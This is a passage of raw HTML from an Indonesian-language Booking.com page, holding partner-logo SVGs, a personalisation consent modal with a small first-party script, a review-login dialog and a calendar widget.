13.6129 10.4313 13 10.97L12.4 11.49L13.09 11.87C13.9391 12.3844 14.6353 13.1164 15.1065 13.9902C15.5776 14.864 15.8067 15.8479 15.77 16.84V16.84ZM4.38 9.96999H7.82C8.18097 9.9814 8.54025 9.91599 8.87405 9.77811C9.20784 9.64023 9.50854 9.43302 9.75624 9.17019C10.0039 8.90737 10.193 8.59493 10.3109 8.25355C10.4287 7.91218 10.4728 7.54966 10.44 7.18999C10.4737 6.82919 10.4276 6.46538 10.305 6.12438C10.1824 5.78338 9.98629 5.47353 9.73052 5.21681C9.47476 4.9601 9.16565 4.7628 8.8251 4.63892C8.48456 4.51504 8.12093 4.46761 7.76 4.49999H5.76C4.76 4.55999 4.34 5.05999 4.34 6.11999L4.38 9.96999ZM11.27 16.57C11.3013 16.1584 11.2434 15.7449 11.1004 15.3577C10.9573 14.9705 10.7324 14.6187 10.441 14.3263C10.1495 14.034 9.79849 13.8079 9.41176 13.6636C9.02502 13.5192 8.6117 13.46 8.2 13.49H5.59C4.76 13.61 4.38 14.12 4.38 15.1V19.68H8.2C8.61895 19.7149 9.04044 19.6568 9.43426 19.5096C9.82808 19.3625 10.1845 19.1301 10.4779 18.829C10.7713 18.528 10.9945 18.1657 11.1314 17.7682C11.2684 17.3708 11.3157 16.9479 11.27 16.53V16.57ZM174.53 6.77999C173.558 6.78366 172.6 7.00575 171.726 7.42984C170.852 7.85393 170.084 8.46915 169.48 9.22999L169.14 9.66999L168.87 9.17999C168.437 8.395 167.787 7.75128 166.998 7.3257C166.209 6.90012 165.314 6.71067 164.42 6.77999C163.6 6.79964 162.792 6.98725 162.048 7.33125C161.303 7.67525 160.637 8.16832 160.09 8.77999L159.65 9.25999L159.48 8.62999C159.323 8.16152 159.008 7.76282 158.587 7.50334C158.167 7.24386 157.669 7.14005 157.18 7.20999H155.18V23.57H159.64V16.31C159.646 15.6629 159.727 15.0187 159.88 14.39C160.31 12.63 161.49 10.74 163.47 10.93C164.69 11.05 165.29 11.99 165.29 13.82V23.57H169.81V16.31C169.791 15.6345 169.875 14.9601 170.06 14.31C170.42 12.64 171.65 10.92 173.56 10.92C174.94 10.92 175.46 11.7 175.46 13.81V21.17C175.46 22.83 176.19 23.57 177.85 23.57H180V13.07C180 8.86999 178.15 6.73999 174.53 6.73999V6.77999ZM133.69 17.86C132.51 19.095 130.913 19.8471 129.21 19.97C128.593 20.0073 127.974 19.914 127.395 19.6962C126.816 19.4784 126.29 19.141 125.85 18.706C125.41 18.271 125.067 17.7482 124.843 17.1716C124.619 16.5951 124.519 15.9778 124.55 15.36C124.498 14.7504 124.575 14.1365 124.776 13.5588C124.978 12.981 125.299 12.4524 125.719 12.0076C126.14 11.5629 126.649 11.212 127.215 10.978C127.78 10.744 128.388 10.6322 129 10.65C129.84 10.65 130.8 10.95 130.95 11.46V11.55C131.048 11.8986 131.258 12.2056 131.547 12.424C131.835 12.6425 132.188 12.7605 132.55 12.76H135V10.61C135 7.76999 131.39 6.73999 129 6.73999C123.81 6.73999 120 10.37 120 15.35C120 20.33 123.73 23.97 128.86 23.97C130.178 23.9562 131.479 23.6722 132.683 23.1355C133.887 22.5989 134.969 21.821 135.86 20.85L134 17.58L133.69 17.86Z"></path></svg></span><span role="img" class="fc70cba028 ca6ff50764" aria-label="Priceline.com"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 69 16"><g fill="#0071C2" clip-path="url(#amsc83whmcx1y4n8a)"><path d="M61.944 7.25c-.056-.369-.113-.878-.48-1.275-.312-.34-.822-.51-1.275-.51a1.79 1.79 0 0 0-1.331.595c-.368.397-.453.821-.538 1.19h3.624Zm2.606 3.341c-.312.453-.623.906-1.076 1.331-.765.736-1.926 1.274-3.342 1.274-2.633 0-4.503-1.699-4.503-4.644 0-2.18 1.048-4.956 4.56-4.956.538 0 2.067.057 3.2 1.303 1.16 1.246 1.217 3.002 1.246 4.021H58.29c-.028 1.133.623 2.238 2.011 2.238 1.444 0 1.926-.935 2.237-1.586l2.01 1.02ZM49.4 4.701c.254-.283.424-.482.877-.708.397-.17.991-.312 1.614-.312.538 0 1.133.114 1.586.369.935.51 1.161 1.302 1.161 2.69v6.145h-2.605v-5.07c0-.82-.028-1.104-.113-1.33-.199-.481-.652-.68-1.161-.68-1.388 0-1.388 1.133-1.388 2.237v4.843h-2.634V3.908h2.634l.028.793Zm-4.305-3.087c0 .793-.623 1.416-1.416 1.416a1.439 1.439 0 0 1-1.416-1.416c0-.793.623-1.416 1.416-1.416a1.42 1.42 0 0 1 1.416 1.416ZM42.376 3.88h2.577v9.005h-2.577V3.88Zm-1.755 9.005h-2.634V0h2.634v12.885ZM34.136 7.25c-.057-.369-.114-.878-.51-1.275-.312-.34-.821-.51-1.274-.51a1.79 1.79 0 0 0-1.331.595c-.369.397-.454.821-.538 1.19h3.653Zm2.633 3.341c-.311.453-.623.906-1.076 1.331-.764.736-1.925 1.274-3.37 1.274-2.633 0-4.502-1.699-4.502-4.644 0-2.18 1.047-4.956 4.559-4.956.538 0 2.067.057 3.2 1.303 1.16 1.246 1.218 3.002 1.274 4.021h-6.371c-.029 1.133.623 2.238 2.039 2.238 1.444 0 1.925-.935 2.265-1.586l1.982 1.02Zm-10.251-.453c0-.028-.057-.028-.057 0-.056.085-.113.198-.198.283-.538.623-1.19.623-1.33.623-1.389 0-1.983-1.5-1.983-2.69 0-1.076.481-2.719 1.897-2.719.397 0 .736.142.991.312.368.255.538.51.68.793.028.028.057.028.057.028.198-.736.566-1.444 1.132-2.01-1.02-.963-2.209-1.133-2.973-1.133-2.974 0-4.475 2.209-4.475 4.814 0 3.681 2.72 4.7 4.418 4.7.991 0 1.87-.339 2.549-.82.142-.114.283-.227.396-.34a3.67 3.67 0 0 1-1.104-1.84Zm-7.306-8.524c0 .793-.623 1.416-1.416 1.416a1.439 1.439 0 0 1-1.416-1.416c0-.793.623-1.416 1.416-1.416a1.42 1.42 0 0 1 1.416 1.416ZM16.493 3.88h2.577v9.005h-2.577V3.88Zm-3.681.934c.566-.51 1.217-.906 2.577-1.02v2.351l-.878.142c-1.246.226-1.643.425-1.643 1.557v5.07h-2.633V3.88h2.548v.934h.029Zm-7.93.736c-.48 0-.962.199-1.359.737-.368.51-.538 1.274-.538 2.124 0 1.132.283 1.84.623 2.209.312.34.736.51 1.161.51 1.275 0 1.841-1.388 1.841-2.804 0-1.19-.312-2.436-1.388-2.719-.113-.028-.226-.057-.34-.057Zm-2.095-.792c.085-.114.17-.199.255-.284.453-.424 1.246-.793 2.237-.793 2.18 0 3.88 1.671 3.88 4.673 0 1.84-.793 4.7-3.852 4.7-.99 0-1.5-.339-2.209-.764V16H.465V3.908h2.322v.85ZM66.475.963c.369 0 .68.085.992.255.311.17.538.425.708.708.17.311.254.623.254.963 0 .34-.085.68-.254.962-.17.312-.397.538-.708.708-.312.17-.623.255-.992.255-.368 0-.68-.085-.99-.255a1.887 1.887 0 0 1-.709-.708 1.96 1.96 0 0 1-.254-.962c0-.34.084-.68.254-.963.17-.312.397-.538.708-.708.312-.17.623-.255.992-.255Zm0 3.426c.284 0 .538-.056.765-.198a1.63 1.63 0 0 0 .538-.538c.142-.226.198-.481.198-.736s-.056-.51-.198-.736a1.63 1.63 0 0 0-.538-.538 1.372 1.372 0 0 0-.736-.199c-.283 0-.538.057-.765.199a1.629 1.629 0 0 0-.538.538 1.372 1.372 0 0 0-.198.736c0 .255.056.51.198.736.142.227.312.397.538.538.198.142.453.198.736.198Zm.822-1.812a.783.783 0 0 1-.085.368c-.057.113-.142.17-.255.227l.396.594h-.538l-.283-.51h-.34v.51h-.481V1.954h.793c.255 0 .425.057.566.17.17.085.227.255.227.453Zm-1.105.312h.34c.113 0 .17-.029.227-.085.056-.057.085-.114.085-.227a.322.322 0 0 0-.085-.227.322.322 0 0 0-.227-.084h-.34v.623Z"></path></g><defs><clipPath id="amsc83whmcx1y4n8a"><path fill="#fff" d="M0 0h67.965v16H0z" transform="translate(.465)"></path></clipPath></defs></svg></span><span role="img" class="fc70cba028 ca6ff50764" aria-label="Kayak"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 84 16"><g clip-path="url(#amsc83whmcx1y4n2a)"><path fill="#FF690F" d="M.43 0h16v16h-16V0Z"></path><path fill="#fff" d="M5.362 4.004h1.945v8H5.362v-8Z"></path><path fill="#fff" d="M11.497 11.997H9.352L7.14 8.001l2.212-3.997h2.145L9.272 8l2.225 3.996Z"></path><path fill="#FF690F" d="M17.319 0h16v16h-16V0Z"></path><path fill="#fff" d="m23.869 10.847-.348 1.163H21.45l2.633-8.02h2.473l2.614 8.02h-2.12l-.347-1.15-2.833-.013Zm1.416-4.558-.935 2.988h1.871l-.936-2.988Z"></path><path fill="#FF690F" d="M34.201 0h16v16h-16V0Z"></path><path fill="#fff" d="M43.203 12.01h-1.958V8.475L38.618 3.99h2.313l1.296 2.46 1.277-2.46h2.279l-2.58 4.485v3.535Z"></path><path fill="#FF690F" d="M51.09 0h16v16h-16V0Z"></path><path fill="#fff" d="m57.64 10.847-.348 1.163H55.22l2.633-8.02h2.473l2.613 8.02h-2.118l-.348-1.15-2.834-.013Zm1.416-4.558-.935 2.988h1.87l-.935-2.988Z"></path><path fill="#FF690F" d="M67.972 0h16v16h-16V0Z"></path><path fill="#fff" d="M72.904 4.004h1.945v8h-1.945v-8Z"></path><path fill="#fff" d="M79.04 11.997h-2.146l-2.212-3.996 2.212-3.997h2.146L76.814 8l2.226 3.996Z"></path></g><defs><clipPath id="amsc83whmcx1y4n2a"><path fill="#fff" d="M0 0h83.542v16H0z" transform="translate(.43)"></path></clipPath></defs></svg></span><span role="img" class="fc70cba028 ca6ff50764" aria-label="Agoda"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 51 20"><g clip-path="url(#amsc83whmcx1y4mza)"><path fill="#262626" d="M13.397 5.98c-.067.531.133 1.063.465 1.528.266.332.73.532 1.13.532.265 0 .531-.067.797-.2s.465-.398.598-.664c.133-.332.266-.731.2-1.063.066-.598-.134-1.13-.466-1.595-.266-.399-.73-.598-1.196-.598-.465 0-.864.2-1.13.532-.265.398-.465.996-.398 1.528Zm4.85-2.06v4.85c0 .466-.066.997-.199 1.462-.133.399-.332.731-.598.997-.266.266-.665.465-.997.598-.465.066-.996.133-1.528.133s-1.063-.067-1.528-.266a3.369 3.369 0 0 1-1.063-.598c-.2-.2-.332-.465-.399-.797 0-.2.066-.399.2-.465a.754.754 0 0 1 .53-.2c.267 0 .466.133.665.333l.266.332c.067.133.2.2.332.332l.399.2c.2.066.399.066.532.066.332 0 .664-.067.996-.2.2-.132.399-.265.532-.531.066-.2.133-.465.2-.665 0-.265 0-.664.066-1.196-.266.333-.532.598-.93.798-.4.2-.798.266-1.197.266-.531 0-.996-.133-1.461-.466-.4-.332-.731-.73-.93-1.196-.266-.531-.333-1.196-.333-1.794 0-.465.067-.93.2-1.329.132-.398.332-.73.598-.996.265-.266.531-.465.863-.598.266-.266.598-.332.997-.332s.864.066 1.262.265c.4.2.731.532.997.864v-.2c0-.265.066-.464.2-.664.066-.199.265-.265.531-.265.266-.067.532.066.664.332.067.266.133.531.133.93ZM27.218 6.046c.067-.598-.133-1.13-.465-1.595-.266-.398-.73-.598-1.196-.598-.332 0-.598.067-.864.266-.266.2-.465.465-.598.731-.265.73-.265 1.528 0 2.326.133.332.332.598.598.73.266.2.532.266.864.266.465 0 .93-.2 1.196-.598.332-.398.532-.93.465-1.528Zm1.661 0c0 .465-.066.93-.266 1.395a2.892 2.892 0 0 1-.664 1.063c-.266.333-.664.532-1.063.665-.465.2-.93.266-1.395.266a3.47 3.47 0 0 1-1.396-.266c-.797-.332-1.461-.997-1.727-1.794-.332-.864-.332-1.86 0-2.79.133-.4.398-.798.664-1.064.266-.332.665-.532 1.063-.664a3.848 3.848 0 0 1 2.725 0c.398.132.73.398 1.063.73.265.333.531.665.664 1.064.266.465.332.93.332 1.395ZM34.593 6.046c0 .4.067.798.2 1.13.133.266.332.532.598.73.266.134.531.267.797.267s.532-.067.797-.2c.266-.199.466-.398.599-.73.132-.4.199-.798.199-1.197 0-.398-.067-.797-.2-1.13a2.078 2.078 0 0 0-.597-.73 1.277 1.277 0 0 0-.798-.266c-.266 0-.598.067-.797.266-.332.2-.532.465-.665.73-.133.4-.199.732-.133 1.13Zm3.323 2.459v-.133c-.2.2-.399.465-.665.598-.2.133-.465.266-.73.399-.266.066-.532.133-.864.133-.4 0-.798-.067-1.13-.266-.332-.2-.665-.399-.864-.731a3.693 3.693 0 0 1-.598-1.13c-.133-.465-.2-.93-.2-1.395 0-1.063.267-1.86.798-2.458.532-.532 1.263-.864 1.994-.864.398 0 .797.066 1.196.266.398.199.664.465.996.73V1.196c0-.266.067-.532.2-.797.133-.2.332-.266.598-.266.199 0 .465.066.598.266.133.199.199.465.199.73v7.376c0 .266-.067.531-.2.73a.842.842 0 0 1-.597.267c-.2 0-.4-.067-.598-.266a.922.922 0 0 1-.133-.731ZM48.082 6.113c-.333.133-.731.2-1.063.266-.466.067-.798.2-.997.2-.2.066-.399.132-.532.265a.842.842 0 0 0-.266.598c0 .266.133.465.333.665.199.199.465.265.73.265.333 0 .599-.066.93-.199.267-.133.466-.332.599-.531.2-.4.266-.798.2-1.263l.066-.266Zm.066 2.392c-.332.266-.73.532-1.196.731-.399.133-.864.266-1.262.266-.4 0-.798-.066-1.13-.266a1.44 1.44 0 0 1-.73-.664c-.2-.266-.267-.598-.267-.93 0-.4.133-.864.465-1.196.333-.333.731-.598 1.197-.665l.797-.133c.398-.066.797-.133 1.063-.266.332-.066.598-.132.997-.265 0-.333-.067-.665-.266-.997-.133-.2-.465-.332-.997-.332-.332 0-.664.066-.93.2-.2.132-.399.331-.532.53-.066.134-.199.333-.332.466-.133.066-.266.133-.398.133a.603.603 0 0 1-.466-.2.603.603 0 0 1-.199-.465c0-.332.133-.598.332-.864.266-.332.598-.531.997-.664.399-.2.93-.266 1.528-.266s1.196.067 1.728.266c.398.133.73.465.93.797.2.465.266.997.266 1.529v1.926c0 .333.066.665.133.997.066.2.133.465.133.665 0 .199-.067.332-.266.465a.755.755 0 0 1-.532.2c-.2 0-.398-.067-.531-.267-.2-.2-.333-.465-.532-.73ZM5.69 6.113c-.333.133-.731.2-1.063.266-.466.133-.798.2-.997.2-.2.066-.399.132-.532.265a.842.842 0 0 0-.265.598c0 .266.132.465.332.665.2.199.465.265.73.265.333 0 .599-.066.93-.199.267-.133.466-.332.599-.531.2-.4.266-.798.2-1.263l.066-.266Zm.066 2.392c-.332.266-.73.532-1.196.731-.399.133-.864.266-1.262.266-.399 0-.798-.066-1.13-.266a1.44 1.44 0 0 1-.73-.664c-.2-.266-.267-.598-.267-.93 0-.4.133-.864.466-1.196.332-.333.73-.598 1.196-.665l.797-.133c.399-.066.797-.133 1.063-.266.266-.066.598-.199.93-.265 0-.333-.066-.665-.266-.997-.132-.2-.465-.266-.93-.266-.332 0-.664.067-.93.2-.266.066-.465.265-.598.465a1.653 1.653 0 0 1-.332.465c-.133.133-.266.133-.399.133a.603.603 0 0 1-.465-.2c-.133-.066-.2-.265-.2-.465 0-.332.134-.598.333-.864.266-.332.598-.531.997-.664.465-.2.996-.266 1.594-.266.598 0 1.196.067 1.728.266.398.133.73.399.93.797.2.465.266.997.266 1.529v1.926c0 .333.066.665.133.997.066.2.133.465.133.665 0 .199-.133.332-.266.465a.754.754 0 0 1-.532.2c-.2 0-.398-.067-.531-.267a18.46 18.46 0 0 0-.532-.73Z"></path><path fill="#ED2A28" d="M4.36 13.422a3.19 3.19 0 1 1 0 6.38 3.19 3.19 0 0 1 0-6.38Z"></path><path fill="#F59E22" d="M14.992 13.422a3.19 3.19 0 1 1-3.19 3.19c0-1.795 1.396-3.19 3.19-3.19Z"></path><path fill="#16AC5B" d="M25.557 13.422a3.19 3.19 0 1 1-.002 6.38 3.19 3.19 0 0 1 .002-6.38Z"></path><path fill="#8252A1" d="M36.188 13.422a3.19 3.19 0 1 1-3.19 3.19c0-1.795 1.396-3.19 3.19-3.19Z"></path><path fill="#347FC2" d="M46.82 13.422a3.19 3.19 0 1 1-3.19 3.19c-.067-1.795 1.395-3.19 3.19-3.19Z"></path></g><defs><clipPath id="amsc83whmcx1y4mza"><path fill="#fff" d="M0 0h49.236v20H0z" transform="translate(.972)"></path></clipPath></defs></svg></span><span role="img" class="fc70cba028 ca6ff50764" aria-label="OpenTable"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 104 24"><path fill="#DA3743" fill-rule="evenodd" d="M.607 12c0-1.588 1.277-2.875 2.853-2.875A2.865 2.865 0 0 1 6.314 12a2.865 2.865 0 0 1-2.854 2.875A2.864 2.864 0 0 1 .607 12Zm20.046 2.875c-1.577 0-2.854-1.287-2.854-2.875a2.864 2.864 0 0 1 2.854-2.875A2.865 2.865 0 0 1 23.506 12c0 1.588-1.279 2.875-2.855 2.875Zm0-14.375C14.348.5 9.236 5.649 9.236 12c0 6.352 5.111 11.5 11.415 11.5 6.306 0 11.416-5.148 11.416-11.5 0-6.35-5.11-11.5-11.415-11.5Z" clip-rule="evenodd"></path><path fill="#262626" fill-rule="evenodd" d="M102.24 11.11c.18 0 .287-.082.287-.23 0-.134-.073-.222-.274-.222h-.187v.452h.174Zm-.448-.68h.507c.281 0 .521.115.521.437a.393.393 0 0 1-.246.37l.307.56h-.307l-.235-.472h-.273v.471h-.274V10.43Zm1.475.7c0-.632-.433-1.083-.994-1.083-.561 0-.989.45-.989 1.082 0 .64.428 1.077.989 1.077.561 0 .995-.437.995-1.076h-.001Zm-2.25 0c0-.788.568-1.325 1.256-1.325.694 0 1.262.537 1.262 1.325 0 .787-.568 1.325-1.262 1.325-.688 0-1.256-.538-1.256-1.325Zm-8.377 5.38a.315.315 0 0 0 .312-.313v-1.154a.314.314 0 0 0-.31-.313h-.05c-.14 0-.28-.14-.28-.281v-6.84c0-.156-.155-.312-.31-.312H90.86c-.155 0-.31.156-.31.312v7.577l.005.197c0 .565.56 1.128 1.12 1.128l.964-.002ZM42.417 9.102c1.553 0 2.863 1.325 2.863 2.896a2.87 2.87 0 0 1-2.863 2.872c-1.57 0-2.848-1.287-2.848-2.872 0-1.597 1.277-2.896 2.848-2.896Zm0-1.823c-2.568 0-4.658 2.116-4.658 4.72 0 2.632 2.045 4.695 4.658 4.695 2.621 0 4.674-2.063 4.674-4.696 0-2.602-2.097-4.72-4.674-4.72Zm37.177 7.36c-.084.24-.592.694-1.17.694-.605 0-.943-.369-.943-.922 0-.582.408-.937 1.155-.937.52 0 .958.199.958.199v.965Zm-.761-4.84c-1.056 0-2.085.268-2.226.325-.141.043-.268.156-.212.398l.142.738c.027.199.154.355.365.284.382-.114 1.24-.242 1.833-.242.69 0 .93.398.9 1.235 0 0-.59-.184-1.253-.184-1.648 0-2.593.894-2.593 2.058 0 1.405.903 2.242 2.198 2.242a2.84 2.84 0 0 0 2.044-.823v.353c0 .17.14.312.31.312h.114a.212.212 0 0 0 .04.003h.48a.315.315 0 0 0 .31-.313v-3.534c0-1.789-.423-2.853-2.452-2.853Zm-11.827 0c-1.248 0-1.853.673-2.095.945v-.492a.314.314 0 0 0-.31-.312h-.737a.314.314 0 0 0-.31.312v5.933a.324.324 0 0 0 .31.313h1.042c.31 0 .409-.072.409-.313V12.44c.155-.454.564-1.022 1.409-1.022.788 0 1.126.525 1.126 1.377v3.392c0 .17.142.313.311.313h1.14a.324.324 0 0 0 .31-.313v-3.392c0-1.59-.535-2.995-2.605-2.995Zm-15.513 5.237c-.818 0-1.353-.37-1.353-.37v-2.342c.141-.37.592-.909 1.438-.909 1.014 0 1.535.895 1.535 1.817 0 .923-.55 1.803-1.62 1.803Zm.324-5.238a2.8 2.8 0 0 0-2.125.977v-.522a.314.314 0 0 0-.31-.313h-.693a.315.315 0 0 0-.31.312v8.601a.325.325 0 0 0 .31.313h1.142c.154 0 .31-.157.31-.313v-2.47a4.8 4.8 0 0 0 1.563.27c1.945 0 3.227-1.504 3.227-3.42 0-1.988-1.34-3.435-3.114-3.435Zm46.462 2.597c-.028-.639-.535-1.136-1.254-1.136-.789 0-1.296.483-1.38 1.136h2.634ZM97.069 9.8c1.69 0 2.985 1.263 2.985 3.037 0 .1-.015.326-.028.426a.331.331 0 0 1-.31.298h-4.17c.015.809.676 1.518 1.62 1.518.648 0 1.099-.241 1.395-.482.155-.128.324-.142.423 0l.549.738c.112.127.127.284-.028.426-.672.583-1.534.9-2.423.894-1.944 0-3.297-1.561-3.297-3.435 0-1.845 1.353-3.42 3.283-3.42ZM86.04 15.037c-.845 0-1.296-.54-1.437-.91v-2.34s.536-.37 1.353-.37c1.07 0 1.62.88 1.62 1.803 0 .922-.521 1.817-1.535 1.817Zm.155-5.238c-.648 0-1.296.156-1.592.284V7.585a.324.324 0 0 0-.31-.313h-1.141c-.155 0-.31.156-.31.313v8.601a.324.324 0 0 0 .31.313h.493c.01 0 .018 0 .028-.003h.132a.314.314 0 0 0 .312-.312v-.485l.007-.025s.748.979 2.17.979c1.776 0 3.058-1.561 3.058-3.434 0-1.917-1.226-3.42-3.156-3.42Zm-9.968-2.527H69.6a.268.268 0 0 0-.267.27v1.165c0 .141.112.269.267.269h2.39v7.253a.278.278 0 0 0 .269.27h1.31a.277.277 0 0 0 .268-.27V8.976h2.39a.268.268 0 0 0 .268-.27V7.542a.27.27 0 0 0-.268-.27Zm-15.775 5.124c-.028-.639-.536-1.136-1.254-1.136-.788 0-1.296.483-1.38 1.136h2.634ZM59.241 9.8c1.691 0 2.987 1.263 2.987 3.037 0 .1-.013.326-.028.426a.332.332 0 0 1-.31.298h-4.17c.015.809.676 1.518 1.62 1.518.649 0 1.099-.241 1.395-.482.155-.128.324-.142.423 0l.549.738c.113.127.127.284-.028.426a3.66 3.66 0 0 1-2.424.894c-1.944 0-3.296-1.561-3.296-3.435 0-1.845 1.352-3.42 3.282-3.42Z" clip-rule="evenodd"></path></svg></span></div></div></div></footer></div></div></div>
<a href="#"
id="pipl-personalization-footer-btn"
data-modal-id="personalisation-modal"
data-component="privacy/personalisation-modal"
data-modal-keep-mounted="true"
data-modal-close-aria-label="Tutup"
style="display:none;">
</a>
<template id="personalisation-modal" data-component="privacy/personalisation-modal">
<header class="bui-modal__header">
<h2 class="bui-modal__title" id="modal-default-title" data-bui-ref="modal-title">
Rekomendasi khusus
</h2>
<p class="bui-modal__paragraph" id="modal-default-subtitle" data-bui-ref="modal-subtitle">
Kami memberikan rekomendasi khusus berdasarkan aktivitas Anda di platform kami. Jika Anda mau, Anda dapat keluar dari opsi ini. Perlu diingat, Anda hanya keluar pada perangkat ini saja. Karena itu, Anda harus menyesuaikan pengaturan ini, jika perlu, pada setiap perangkat lain untuk mencerminkan preferensi Anda.
</p>
</header>
<footer class="bui-modal__footer">
<div class="bui-switch">
<div class="bui-input-text__content">
<input type="checkbox"
checked="checked"
id="personalization-switch-1"
class="bui-switch__trigger"
aria-label="
Rekomendasi khusus
"
aria-checked="true"
role="switch"/>
<label for="personalization-switch-1"
aria-hidden="true"
class="bui-switch__hitbox"
data-on-value="
Tampilkan rekomendasi khusus
"
data-off-value="
Tampilkan rekomendasi khusus
">
<span class="bui-switch__indicator"></span>
</label>
</div>
</div>
</footer>
</template>
<style>
.rtl .bui-switch__trigger:checked + .bui-switch__hitbox .bui-switch__indicator:before,
[dir="rtl"] .bui-switch__trigger:checked + .bui-switch__hitbox .bui-switch__indicator:before {
transform: translate(calc(-1 * var(--bui_spacing_6x)));
}
</style>
<script type="text/javascript" nonce="cH3DZKVyvb8x5Uh">
(function () {
document.addEventListener('click', function (e) {
if (e.target.id === 'personalization-switch-1') {
toggleSwitchLock(true);
var httpRequest = new XMLHttpRequest();
httpRequest.open('PUT', '/consent/personalization?value=' + (e.target.checked ? '0' : '1'), true);
httpRequest.onload = function () {
toggleSwitchLock(false);
B.require('events').trigger('privacy:personalisation-updated');
}
httpRequest.send();
}
});
function toggleSwitchLock(lock) {
var checkbox = document.getElementById('personalization-switch-1');
if (lock) {
checkbox.setAttribute('disabled', 'disabled');
} else {
checkbox.removeAttribute('disabled');
}
}
function trackCustomGoal(goal) {
if (window.B && window.B.et) {
window.B.et.customGoal('YTBeWfCDIXLSGbDaFSRfABNIPRaO', goal);
}
}
})();
</script>
</div>
<div
id="revc_write_a_review_login_intro"
style="display:none;"
tabindex="-1"
>
<span class="invisible_spoken">Awal konten dialog</span>
<div class="intro_header">
<h2 class="bui-modal__title">Ulasan terverifikasi dari tamu asli.</h2>
<p class="bui-modal__paragraph">Kami punya lebih dari 70 juta ulasan akomodasi, dan semuanya berasal dari <strong>tamu asli dan terverifikasi</strong>.</p>
</div>
<div class="rlp-intro">
<div class="rlp-intro__container clearfix">
<h2 class="rlp-intro__title rlp-intro__a11y-exp-title">Bagaimana caranya?</h2>
<ul class="rlp-intro-how a11y_contrast_blue_gray">
<li class="rlp-intro-how__item fl">
<div class="rlp-intro-how__container rlp-intro-how__container--tickfull">
<div class="rlp-intro-how__sub-container">
<p class="rlp-intro-how__num rlp-intro-how__num--tickfull">1</p>
<p class="rlp-intro-how__icon bicon-tickfull" aria-hidden="true"></p>
</div>
</div>
<h3 class="rlp-intro-how__title rlp-intro-how__a11y-exp-title">Pesan dulu</h3>
<span class="rlp-intro-how__title rlp-intro-how__caption">Pesan dulu</span>
<p class="rlp-intro-how__desc">Untuk memberi ulasan, Anda harus membuat pemesanan terlebih dahulu. Begitulah caranya bagaimana ulasan kami berasal dari tamu asli yang telah menginap di akomodasi yang mereka pilih.</p>
</li>
<li class="rlp-intro-how__arrow fl" aria-hidden="true">
<p class="rlp-intro-how__arrow-icon bicon-rightchevron"></p>
</li>
<li class="rlp-intro-how__item fl">
<div class="rlp-intro-how__container rlp-intro-how__container--citytrip">
<div class="rlp-intro-how__sub-container">
<p class="rlp-intro-how__num rlp-intro-how__num--citytrip">2</p>
<p class="rlp-intro-how__icon bicon-citytrip" aria-hidden="true"></p>
</div>
</div>
<h3 class="rlp-intro-how__title rlp-intro-how__a11y-exp-title">Nikmati masa inap Anda</h3>
<span class="rlp-intro-how__title rlp-intro-how__caption">Nikmati masa inap Anda</span>
<p class="rlp-intro-how__desc">Saat tamu sedang menginap, mereka bisa lihat apakah kamarnya nyaman, para staf nya ramah, dan hal-hal lainnya.</p>
</li>
<li class="rlp-intro-how__arrow fl" aria-hidden="true">
<p class="rlp-intro-how__arrow-icon bicon-rightchevron"></p>
</li>
<li class="rlp-intro-how__item fl">
<div class="rlp-intro-how__container rlp-intro-how__container--feedback">
<div class="rlp-intro-how__sub-container">
<p class="rlp-intro-how__num rlp-intro-how__num--feedback">3</p>
<p class="rlp-intro-how__icon bicon-feedback" aria-hidden="true"></p>
</div>
</div>
<h3 class="rlp-intro-how__title rlp-intro-how__a11y-exp-title">Terakhir, beri ulasan</h3>
<span class="rlp-intro-how__title rlp-intro-how__caption">Terakhir, beri ulasan</span>
<p class="rlp-intro-how__desc">Setelah menginap, tamu akan memberi tahu kami tentang masa inap mereka. Kami akan periksa terlebih dahulu setiap ulasan dan keasliannya sebelum ditampilkan di website kami.</p>
</li>
</ul>
</div>
</div>
<p>Jika Anda memesan lewat kami dan ingin menulis ulasan, harap login dulu.</p>
<div class="intro_footer">
<a href="https://secure.booking.com/reviewtimeline.id.html?aid=356980&label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&sid=7ddc46c9c1086cdb3bc11bc91f12833b&from_index_lightbox=1" class="revc_write_a_review_login_button">Login dan tulis ulasan</a>
</div>
<span class="invisible_spoken">Akhir konten dialog</span>
</div>
<div id="calendar_popup" class="newcalendar singleCalendar" style="display:none; ">
<div class="calendar_popup_title"><p id="calendar_check_in_title">Tanggal check-in</p>
<p id="calendar_check_out_title">Tanggal check-out</p>
</div>
<div class="browseCalendar" >
<a href="#" class="prevmonth disabled"><span>&laquo;</span></a>
<select title="Tanggal check-in/Tanggal check-out">
<option class="b_months" value="2025-9">
</option>
<option class="b_months" value="2025-10">
</option>
<option class="b_months" value="2025-11">
</option>
<option class="b_months" value="2025-12">
</option>
<option class="b_months" value="2026-1">
</option>
<option class="b_months" value="2026-2">
</option>
<option class="b_months" value="2026-3">
</option>
<option class="b_months" value="2026-4">
</option>
<option class="b_months" value="2026-5">
</option>
<option class="b_months" value="2026-6">
</option>
<option class="b_months" value="2026-7">
</option>
<option class="b_months" value="2026-8">
</option>
<option class="b_months" value="2026-9">
</option>
<option class="b_months" value="2026-10">
</option>
<option class="b_months" value="2026-11">
</option>
<option class="b_months" value="2026-12">
</option>
</select>
<a href="#" class="nextmonth"><span>&raquo;</span></a>
</div>
<table>
<tbody>
<tr>
<th>S</th><th>S</th><th>R</th><th>K</th><th>J</th><th>S</th><th>M</th>
</tr>
<tr><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td class="wk_ar">&nbsp;</td><td class="wk wk_ar">&nbsp;</td><td class="wk">&nbsp;</td></tr>
<tr><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td class="wk_ar">&nbsp;</td><td class="wk wk_ar">&nbsp;</td><td class="wk">&nbsp;</td></tr>
